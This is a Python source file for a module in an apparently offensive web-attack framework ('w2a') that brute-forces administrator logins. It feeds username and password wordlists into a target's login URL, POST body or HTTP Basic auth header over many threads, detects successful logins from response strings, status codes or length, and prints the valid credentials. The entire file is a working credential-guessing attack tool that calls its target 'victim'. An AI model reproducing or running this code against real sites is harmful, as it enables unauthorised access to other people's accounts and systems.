#  Copyright 2012 Kid :">

from w2a.core.templates import Templates
from w2a.lib.net.http import HTTP
from w2a.config import CONFIG
from w2a.lib.file import FullPath, ReadFromFile
from w2a.lib.thread import Thread

from base64 import b64encode
from time import sleep
from urllib.parse import quote_plus, unquote
from copy import deepcopy
from re import search

class Module(Templates):
	def __init__(self, *args, **kwargs):
		super().__init__(*args, **kwargs)
		self.version		= 1
		self.author			= [ 'Kid' ]
		self.description 	= 'Brute administrator account'
		self.detailed_description	= 'This module retreives connect with dictionary username and password'
		#########################################
		self.userarg		= '__USER__'
		self.passarg		= '__PASS__'
		#########################################
		self.options.addString('URL', 'Link login')
		self.options.addString('DATA', 'Date with POST method', False)
		self.options.addString('USERNAME', 'Account login', False)
		self.options.addString('PASSWORD', 'Password login', False)
		self.options.addPath('USERLIST', 'File containing username list', default = CONFIG.DATA_PATH + '/brute/username.lst')
		self.options.addPath('PASSLIST', 'File containing password list', default = CONFIG.DATA_PATH + '/brute/pass.vn')
		self.options.addString('CHECKTYPE', 'Type of checker success login', default = 'errorstr', complete = ['errorstr', 'successstr', 'status', 'author','lenght'])
		self.options.addString('TOKEN', 'Error/Success string', False)
		self.options.addInteger('THREADS', 'Multithreading', default = 10)
		self.options.addBoolean('VERBOSE', 'Verbose', default = True)

		self.advanced_options.addString('COOKIE', 'Cookie', False)
		self.advanced_options.addInteger('DELAY', 'Delay time if thread = 1', default = 1)
		self.advanced_options.addInteger('TIMEOUT', 'Time out request', default = CONFIG.TIME_OUT)
		self.advanced_options.addBoolean('STOP', 'Stop scanning host after first valid username/password found', default = True)
		####
		self.initcallbacker	= None

	def run(self, frmwk, args):
		self.frmwk				= frmwk
		self.victim				= HTTP(self.options['URL'], timeout = self.advanced_options['TIMEOUT'])
		self.victim.storecookie	= True
		self.verbose 			= self.options['VERBOSE']

		self.userlist			= []
		self.passlist			= []
		self.success			= []

		self.victim.headers.update({'Cookie': self.advanced_options['COOKIE']} if self.advanced_options['COOKIE'] else {})
		#######################################
		if self.options['USERNAME']:
			self.userlist	= self.options['USERNAME'].split(',')
		else:
			self.userlist 	= ReadFromFile(FullPath(self.options['USERLIST']))

		if self.options['PASSWORD']:
			self.passlist	= self.options['PASSWORD'].split(',')
		else:
			for a in ReadFromFile(FullPath(self.options['PASSLIST'])):
				self.passlist.append(a)

		self.lenuser	= len(self.userlist)
		self.lenpass	= len(self.passlist)
		###############################################
		listthread	= []
		if len(self.userlist) > 0:
			self.temppass	= []
			for i in range(self.options['THREADS']):
				t	= Thread(target = self.worker)
				listthread.append(t)
				t.start()
			try:
				for t in listthread:
					t.join()
			except KeyboardInterrupt:
				for t in listthread:
					if t.isAlive():
						t.terminate()
				pass
			##############################################
			self.success = sorted(self.success)
			self.frmwk.print_line()
			self.frmwk.print_status("List login:\n-----------")
			if len(self.success) > 0:
				for u, p in self.success:
					self.frmwk.print_success('SUCCESS:	username: {0:<20} password: {1}'.format(u, p))
			self.frmwk.print_status("-----------")
		else:
			self.frmwk.print_status('Nothing to do!')
	
	def worker(self):
		victim		= self.victim
		url 		= self.options['URL']
		postdata	= self.options['DATA']

		if self.initcallbacker:
			result = self.initcallbacker()
			if result:
				if result[0]:
					url = result[0]
				if result[1]:
					victim.headers.update(result[1])
				if result[2]:
					postdata = result[2]
				del result
			else:
				self.frmwk.print_error('Init false!')
				return
		while len(self.userlist) > 0:
			if len(self.temppass) == 0:
				self.temppass	= self.passlist + []
			################################################
			while len(self.temppass) > 0:
				if len(self.userlist) > 0:
					username	= quote_plus(self.userlist[0])
				else:
					return
				password	= quote_plus(self.temppass.pop(0))

				if len(self.temppass) == 0:
					del self.userlist[0]
				################################################
				if self.options['CHECKTYPE'] == 'author':
					tempurl		= url
					victim.headers.update({'Authorization': "Basic " + b64encode((unquote(username) + ':' + unquote(password)).encode('ascii')).decode('utf-8')})
					data		= victim.Request(tempurl)
				elif postdata:
					tempurl		= url
					tempdata	= postdata.replace(self.userarg , username).replace(self.passarg , password)
					data		= victim.Request(tempurl, 'POST', tempdata)
				else:
					tempurl		= url.replace(self.userarg , username).replace(self.passarg , password)
					data		= victim.Request(tempurl)
				
				username	= unquote(username)
				password	= unquote(password)
				check		= 'FAILURE'
				printer		= self.frmwk.print_status
				if not self.checker(victim):
					self.success.append([username , password])
					self.temppass	= []
					victim			= self.victim
					check			= 'SUCCESS'
					printer			= self.frmwk.print_success

				percent	= 100 - int((self.lenpass * len(self.userlist))*100/(self.lenuser * self.lenpass))

				if self.verbose == True:
					printer('[{0:d}%] {1}:	Username: {2:<20} Password: {3}'.format(percent, check, username, password))
				else:
					self.frmwk.print_process(percent)
				
				if self.advanced_options['STOP'] and len(self.success) > 0:
					return
				
				if check == 'SUCCESS':
					break

				if self.advanced_options['DELAY'] and self.options['THREADS'] == 1:
					sleep(self.advanced_options['DELAY'])
			################################################
	def checker(self, victim):
		token		= self.options['TOKEN']
		checktype	= self.options['CHECKTYPE']
		if checktype == 'errorstr':
			if search(token,victim.result):
				return True
			return False
		elif checktype == 'successstr':
			if search(token,victim.result):
				return False
			return True
		elif checktype == 'status':
			if str(victim.response.status) in token.split(','):
				return True
			return False
		elif checktype == 'author':
			if victim.response.status == 401:
				return True
			return False
		elif checktype == 'lenght':
			if len(victim.result) - int(token) < 50:
				return True
			return False
